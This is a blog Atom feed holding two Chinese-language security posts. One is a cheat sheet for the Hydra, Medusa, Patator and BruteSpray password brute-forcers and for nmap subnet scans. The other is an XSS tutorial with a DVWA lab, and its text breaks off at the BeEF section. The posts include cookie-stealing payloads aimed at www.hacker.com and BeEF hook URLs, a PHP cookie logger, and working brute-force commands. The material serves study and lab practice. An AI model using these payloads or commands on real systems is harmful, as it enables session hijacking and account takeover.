<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jughead YQQ</title>
  
  
  <link href="https://jason177.com/atom.xml" rel="self"/>
  
  <link href="https://jason177.com/"/>
  <updated>2022-03-03T15:11:31.000Z</updated>
  <id>https://jason177.com/</id>
  
  <author>
    <name>Jughead YQQ</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记不住的命令</title>
    <link href="https://jason177.com/2022/03/03/boom/"/>
    <id>https://jason177.com/2022/03/03/boom/</id>
    <published>2022-03-03T13:36:51.000Z</published>
    <updated>2022-03-03T15:11:31.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="记不住呀"><a href="#记不住呀" class="headerlink" title="记不住呀"></a>记不住呀</h1><p>哎！我的记忆力真的不允许我记住这么多命令！！！所以我水一篇文章吧用来记录我那些记不住的命令，嚯嚯嚯</p><h1 id="密码暴力破解"><a href="#密码暴力破解" class="headerlink" title="密码暴力破解"></a>密码暴力破解</h1><p><strong>黑客往往不会破解某一个机器，而是先扫描主机的C段，看有多少台机器是开着并且已经开了相应哪个端口，然后一起暴力破解。</strong>暴力破解分离线和在线，在线意思就是在你网站服务开启的状态下直接爆破，很容易被发现。离线破解就是把密码文件给弄下来，然后用工具对这个文件破解。</p><h2 id="Hydra海德拉"><a href="#Hydra海德拉" class="headerlink" title="Hydra海德拉"></a>Hydra海德拉</h2><p>Hydra几乎支持所有协议的在线密码破解</p><p>添加参数：</p><ul><li>-l：后跟指定的用户名，大写L则表示爆破的用户名文件</li><li>-p：后跟指定的密码，大写P则表示爆破的密码文件</li><li>-o：把破解的账号和密码存放到后面跟着的文件中</li><li>-M：后跟存放主机IP的文件</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Examples:</span><br><span class="line">hydra -l user -P passlist.txt ftp://192.168.0.1      //可以指定是哪个协议</span><br><span class="line">hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN      //可以指定是哪个协议</span><br><span class="line">hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5      //可以指定是哪个协议</span><br><span class="line">hydra -l admin -p password ftp://[192.168.0.0/24]/      //可以指定是哪个协议</span><br><span class="line">hydra -L logins.txt -P pws.txt -M targets.txt ssh      //可以指定是哪个协议</span><br></pre></td></tr></table></figure><p>接下来尝试一下破解我的kali，IP地址是：192.168.29.140,</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203032222271.png" alt="image-20220303222210066"></p><p>可以看到已经破解了远程登录的普通账号kali，但是root账号因为没有设置远程连接，所以破解不了</p><p>把账号密码存到文件中用-o 指定文件名</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203032225763.png" alt="image-20220303222547637"></p><p>如果密码中有空格的话，可以存到文件中，然后在命令模式下输入:set list就可以在后面加一个$符，就可以看到是否有空格了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203032228292.png" alt="image-20220303222810225"></p><h2 id="Medusa美杜莎"><a href="#Medusa美杜莎" class="headerlink" title="Medusa美杜莎"></a>Medusa美杜莎</h2><p>Medusa(美杜莎)是一个速度快，支持大规模并行，模块化，爆破登录。medusa 的稳定性相较于 hydra 要好很多，但 其支持模块要比 hydra 少一些。</p><p>参数：</p><ul><li>-h：目标主机名或者IP地址，大写H表示包含目标主机名称或者IP地址的文件</li><li>-u：测试的用户名，大写U表示包含测试用户名的文件</li><li>-p：测试的密码，大写P表示包含测试密码的文件</li><li>-M：模块执行名称(协议)</li><li>-O：写进指定文件里</li><li>-s：启用SSL</li><li>-t：设定线程数量</li><li>-v：详细级别(0-6)，大V显示版本</li><li>-Z：继续扫描上一次</li><li>-f：在任何主机上找到第一个账号/密码后，停止破解，大写F是在任何主机上找到第一个有效的用户名/密码后停止审计(没看懂啥区别)</li></ul><p>简单尝试了一下，没有设置线程的时候是真滴慢…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -M ssh -h 192.168.29.137 -U user.txt -P password.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040231348.png" alt="image-20220304023147108"></p><p>如果设置了线程为10的话就会好很多</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -M ssh -h 192.168.29.137 -U user.txt -P password.txt -t 10</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040233324.png" alt="image-20220304023313199"></p><p>设置把破解成功的账号密码写进文件里</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -M ssh -h 192.168.29.137 -U user.txt -P password.txt -O medusa.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040244424.png" alt="image-20220304024458356"></p><p>设置如果有成功的破解案例，页面就暂停下来，当然了，是只有成功了才暂停！不是只显示成功的案例！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -M ssh -h 192.168.29.137 -U user.txt -P password.txt -F</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040239191.png" alt="image-20220304023918128"></p><p>可以看到成功了就会停下来，如果我把正确的账号和密码放在txt文件里的第一位，那就会只会显示成功，后面就会暂停下来不再继续破解</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040240591.png" alt="image-20220304024048525"></p><h2 id="Patator"><a href="#Patator" class="headerlink" title="Patator"></a>Patator</h2><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040252343.png" alt="image-20220304025228247"></p><p>参数：(没有加 - 的参数就是不用加 - )</p><ul><li>user：用户名</li><li>password：密码</li><li>host：主机</li><li>-x：可以忽略某些消息，比如failed</li></ul><p>如果是爆破的话可以用以下方法，用户名和密码定义为一个FILE+名，然后把文件的内容赋值给这个名(讲得好棒棒)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patator ssh_login host=192.168.29.137 user=FILE0 0=user.txt password=FILE1 1=password.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040400694.png" alt="image-20220304040015444"></p><p>如果要忽略爆破错误的内容，就加一个参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patator ssh_login host=192.168.29.137 user=FILE0 0=user.txt password=FILE1 1=password.txt -x ignore:mesg=&#x27;Authentication failed.&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040402056.png" alt="image-20220304040253972"></p><p>注意后面输出的用户名和密码的顺序是看FILE后面加的名字来排序的，如果0和1倒过来，那密码就在前面，用户名在后面</p><h2 id="BrutesPray"><a href="#BrutesPray" class="headerlink" title="BrutesPray"></a>BrutesPray</h2><p>BruteSpray 是一款基于nmap扫描输出的gnmap/XML文件.自动调用Medusa对服务进行爆破(Medusa美杜莎 是一款端口 爆破工具,速度比Hydra九头蛇快)</p><p>参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-f FILE, --file FILE 参数后跟一个文件名, 解析nmap输出的GNMAP或者XML文件</span><br><span class="line">-o OUTPUT, --output OUTPUT 包含成功尝试的目录</span><br><span class="line">-s SERVICE, --service SERVICE 参数后跟一个服务名, 指定要攻击的服务</span><br><span class="line">-t THREADS, --threads THREADS 参数后跟一数值,指定medusa线程数</span><br><span class="line">-T HOSTS, --hosts HOSTS 参数后跟一数值,指定同时测试的主机数</span><br><span class="line">-U USERLIST, --userlist USERLIST 参数后跟用户字典文件</span><br><span class="line">-P PASSLIST, --passlist PASSLIST 参数后跟密码字典文件</span><br><span class="line">-u USERNAME, --username USERNAME 参数后跟用户名,指定一个用户名进行爆破</span><br><span class="line">-p PASSWORD, --password PASSWORD 参数后跟密码,指定一个密码进行爆破</span><br><span class="line">-c, --continuous 成功之后继续爆破</span><br><span class="line">-i, --interactive 交互模式</span><br></pre></td></tr></table></figure><p>然后我们需要用nmap先扫描一下某个主机的网段中都有哪些主机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -v 192.168.106.0/24 -oX nmap.xml  # -v 输出详细信息，-oX 输出xml文件</span><br><span class="line">nmap -A -p22 -v 192.168.106.0/24 -oX 22.xml  # -A 综合扫描 -p 指定端口</span><br><span class="line">nmap –sP 192.168.106.0/24 -oX nmaplive.xml   #-sP ping扫描</span><br><span class="line">nmap -sV –O 192.168.106.0/24 -oX nmap.xml    #-sV 显示版本信息 -O 显示操作系统</span><br></pre></td></tr></table></figure><p>我们就用一个半连接来测试打开了22端口的主机有哪些并且存进brute.xml文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p 22 192.168.29.137/24 -oX brute.xml </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040446321.png" alt="image-20220304044642205"></p><p>然后查看brute.xml，可以看到是xml格式的文件</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040450623.png" alt="image-20220304045049531"></p><p>当然如果想知道被扫的主机有哪些，我们可以过滤一下这个xml文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep 192.168 brute.xml</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040516722.png" alt="image-20220304051603643"></p><p>可以看到除了网关、VMnet8和254外，还剩137，说明我们要扫的主机有192.168.29.137，我们也可以用|wc -l查看有多少行</p><p>接下来开始爆破啦~(<strong>注意，如果要扫很多个主机，一定要加-c！不然成功一次之后就会停止爆破了</strong>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brutespray --file brute.xml -U user.txt -P password.txt --threads 5 --hosts 5</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040500681.png" alt="image-20220304050012509"></p><p>这时候就显示已经有一对用户名和密码爆破成功了，也可以在上面看到是哪个主机被爆破成功。如果爆破量大的话可以直接看文件，上面显示文件保存在该目录中的brutespray-output文件夹中了。如下可以看到成功爆破的信息</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040502722.png" alt="image-20220304050208668"></p><h2 id="OSI模型"><a href="#OSI模型" class="headerlink" title="OSI模型"></a>OSI模型</h2><p><a href="https://zhuanlan.zhihu.com/p/248667559">https://zhuanlan.zhihu.com/p/248667559</a></p><p><a href="https://www.cnblogs.com/dbhui/p/9598980.html">https://www.cnblogs.com/dbhui/p/9598980.html</a></p>]]></content>
    
    
    <summary type="html">真的记不住这些命令所以写篇文章记一下</summary>
    
    
    
    <category term="MISC" scheme="https://jason177.com/categories/MISC/"/>
    
    
    <category term="review" scheme="https://jason177.com/tags/review/"/>
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="https://jason177.com/2022/02/25/xss/"/>
    <id>https://jason177.com/2022/02/25/xss/</id>
    <published>2022-02-25T06:23:04.000Z</published>
    <updated>2022-02-25T09:33:40.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>XSS(Cross Site Scripting)：跨站脚本攻击，其实跟CSRF，即跨站请求伪造相似却不同。XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。浏览器的同源策略可以限制跨域请求，但是有些标签(img、iframe、script等)不受同源策略的限制，所以才让XSS有机可乘。<strong>XSS是指攻击者利用网站没有对用户提交的数据进行转义处理或者过滤，进而添在网页上添加一些恶意代码嵌入到web页面中，别的用户访问该页面都会执行相应的代码。</strong>一般来说XSS漏洞只对客户端有影响，不会危害服务器，比如在网页上挂马的话会对该网站访问的用户有危害，因为可以盗取用户的登录信息等等…但是如果该网页具有XSS漏洞，那服务器端也是逃避不了责任的。</p><h1 id="XSS类型："><a href="#XSS类型：" class="headerlink" title="XSS类型："></a>XSS类型：</h1><ol><li>反射型XSS(非持久型)：用户访问带有XSS漏洞的网站A，且访问的链接是包含着一个带XSS攻击向量的网站A的链接(每次攻击都需要用户打开这个链接)，只要用户点击恶意链接的URL时，恶意代码就会在用户主机上的浏览器执行。</li><li>存储型XSS(持久型)：一般是那种留言板或者论坛，XSS攻击代码会存储在网站的服务器中，当页面被用户打开时，服务器就会从数据库中读取然后响应给用户主机，然后用户的浏览器就会执行这段脚本了。</li><li>DOM XSS：客户端的js可以对页面dom节点进行动态的操作，比如插入、修改页面的内容。攻击者构造出特殊的URL、在其中可能包含恶意代码，当用户打开该URL时，用户浏览器收到响应后解析执行。前端使用js取出url中的恶意代码并执行。</li></ol><h1 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h1><p>1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号 </p><p>2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力 </p><p>3、盗窃企业重要的具有商业价值的资料 </p><p>4、非法转账 </p><p>5、强制发送电子邮件 </p><p>6、网站挂马 </p><p>7、控制受害者机器向其它网站发起攻击</p><h1 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h1><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><blockquote><p>iframe元素会创建包含另外一个文档的内联框架（即行内框架）。</p><p>textarea标签定义多行的文本输入控件。</p><p>img 元素向网页中嵌入一幅图像。</p><p>script标签用于定义客户端脚本，比如 JavaScript。 script 元素既可以包含脚本语句，也可以通过 src 属性指向外部脚本文件。 必需的 type 属性规定脚本的 MIME 类型。 JavaScript 的常见应用时图像操作、表单验证以及动态内容更新。</p></blockquote><h2 id="常用JS方法"><a href="#常用JS方法" class="headerlink" title="常用JS方法"></a>常用JS方法</h2><blockquote><p>alert alert() 方法用于显示带有一条指定消息和一个 确认 按钮的警告框 </p><p>window.location window.location 对象用于获得当前页面的地址 (URL)，并把浏览器重定向到新的页面。</p><p>location.href 返回当前显示的文档的完整 URL </p><p>onload 一张页面或一幅图像完成加载 </p><p>onsubmit 确认按钮被点击 </p><p>onerror 在加载文档或图像时发生错误</p></blockquote><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">弹框警告</span><br><span class="line">此脚本实现弹框提示，一般作为漏洞测试或者演示使用,类似SQL注入漏洞测试中的单引号<span class="string">&#x27;, 一旦此脚本能执行，也就意</span></span><br><span class="line"><span class="string">味着后端服务器没有对特殊字符做过滤&lt;&gt;/&#x27;</span> 这样就可以证明，这个页面位置存在了XSS漏洞。</span><br><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">页面嵌套</span><br><span class="line">&lt;iframe src=http:<span class="comment">//www.baidu.com width=300 height=300&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">http://www.baidu.com</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">border</span>=<span class="string">0</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">页面重定向</span><br><span class="line">&lt;script&gt;<span class="built_in">window</span>.location=<span class="string">&quot;http://www.qfedu.com&quot;</span>&lt;/script&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://www.baidu.com&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">弹框警告并重定向</span><br><span class="line">&lt;script&gt;alert(<span class="string">&quot;请移步到我们的新站&quot;</span>);location.href=<span class="string">&quot;http://www.qfedu.com&quot;</span>&lt;/script&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>);location.href=<span class="string">&quot;http://10.1.64.35/mutillidae/robots.txt&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">这里结合了一些社工的思路，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信</span><br><span class="line">息，则可能在另外的站点重新登录账户（克隆网站收集账户）</span><br><span class="line">访问恶意代码</span><br><span class="line">&lt;script src=<span class="string">&quot;http://www.qfedu.com/xss.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://BeEF_IP:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> #结合BeEF收集用户的cookie</span><br><span class="line">巧用图片标签</span><br><span class="line">&lt;img src=<span class="string">&quot;#&quot;</span> onerror=alert(<span class="string">&#x27;xss&#x27;</span>)&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://BeEF_IP:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br><span class="line"><span class="xml">绕开过滤的脚本</span></span><br><span class="line"><span class="xml">大小写 <span class="tag">&lt;<span class="name">ScrIpt</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">SCRipt</span>&gt;</span></span></span><br><span class="line"><span class="xml">字符编码 采用URL、Base64等编码</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span></span></span></span><br><span class="line"><span class="tag"><span class="xml"><span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span>&amp;#116</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="xml">;<span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span>&quot;</span>&gt;</span>yangge<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">收集用户cookie</span></span><br><span class="line"><span class="xml">打开新窗口并且采用本地cookie访问目标网页，打开新窗口并且采用本地cookie访问目标网页。</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&#x27;+document.cookie&quot;</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">img.width = <span class="number">0</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">img.height = <span class="number">0</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h1 id="DVWA实验-手动"><a href="#DVWA实验-手动" class="headerlink" title="DVWA实验(手动)"></a>DVWA实验(手动)</h1><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>首先把DVWA Security调成low级别并确定，然后点击XSS reflected</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251616110.png" alt="image-20220225161607996"></p><p>虽然已知该输入框存在XSS漏洞，但是平时我们可以先输入一个简单的脚本来测试一下是否真的有XSS漏洞，比如一个简单的弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;jason&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>粘贴到输入框并提交</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251617079.png" alt="image-20220225161743991"></p><p>确实有弹窗出现并把对应内容给显示了出来，说明这里有XSS漏洞，可以看到URL栏已经改变，这是一个带有XSS脚本的DVWA网站恶意链接，只要黑客把该URL发给其它用户，欺骗其它用户去点击(给个超链接什么的)，就会产生同样的效果，所以该效果可以用来欺骗登陆过该网站的用户，只要点击该链接，就会造成cookie泄露或者其它信息泄露</p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS比反射型XSS更实用一点，存储型XSS只要用户不小心浏览到了该页面就会触发脚本，而反射型XSS需要用户点击该链接。</p><p>接下来我们模拟把每个浏览到该页面的用户的cookie保存到黑客的服务器中。这里我们把kali当做黑客存储cookie的服务器，打开kali中的apache服务</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251627291.png" alt="image-20220225162753969"></p><p>然后我们在web默认的路径/var/www/html/下创建一个名为cookie_rec.php(什么名都可以)的php脚本，用来创建cookie.txt并存储所拿到的用户的cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cookie_rec.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251629993.png" alt="image-20220225162948929"></p><p>因为我们的kali的IP地址为:192.168.29.137，所以我们制作一个攻击脚本用来把用户的cookie返回到黑客服务器中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.open(<span class="string">&#x27;http://192.168.29.137/cookie_rec.php?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>我们把该段代码输入到XSS stored模块中带有XSS漏洞的输入框中并提交，但是前端对输入内容有字数限制，所以我们F12利用查看器修改前端的代码，这里显示把输入框内容限制在50</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251646904.png" alt="image-20220225164617776"></p><p>我们改成200后粘贴脚本到输入框并且提交</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251702003.png" alt="image-20220225170230957"></p><p>然后就会出现一个空白页(而且还要用浏览器先允许弹窗！！！)，上面的URL会显示cookie信息和黑客的服务器IP(所以其实这种方法只是用来测试黑客的攻击方式，但其实现实生活中是不太可行的)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251647024.png" alt="image-20220225164706958"></p><p>然后再去kali文件看一下…好像没发现cookie.txt…后来又改了一下php的缩进还是不行，然后ls -l发现其实是权限不够(居然要提前把权限给到用户才行..所以这只是测试一下而已，现实生活中谁会这么黑！！)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251647238.png" alt="image-20220225164748159"></p><p>我们来把kali服务器中的文件权限给到DVWA用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R www-data.www-data /var/www/</span><br></pre></td></tr></table></figure><p>再在输入框执行一遍脚本，然后就会把cookie生成到kali的cookie.txt了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251648731.png" alt="image-20220225164842646"></p><p>而且只要有用户浏览到该页面，都会执行该脚本，把自己的cookie信息提交到kali服务器中的cookie.txt</p><p>我们用其它浏览器来登录DVWA并浏览一下该网页(记得把DVWA security调到low，然后点击XSS stored并允许弹窗)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251705476.png" alt="image-20220225170557392"></p><p>这里显示其它浏览器的cookie是跟之前那个不一样的，然后我们再在kali中查看cookie.txt</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251707701.png" alt="image-20220225170701639"></p><p>又有一个新的cookie存在里面了，所以只要用户点击该页面，就会暴露自己的cookie，所以存储型XSS比反射型XSS危害更大，且更实用</p><h1 id="自动化XSS-Beef"><a href="#自动化XSS-Beef" class="headerlink" title="自动化XSS(Beef)"></a>自动化XSS(Beef)</h1><p>手动化其实比较麻烦，如果能像sqlmap那样一款工具直接上手就好了，正好Beef就是这样一款自动化工具</p><p>BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透； BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单</p><p>首先我们先启动kali中的apache服务，因为Beef也是需要apache提供web服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start apache2   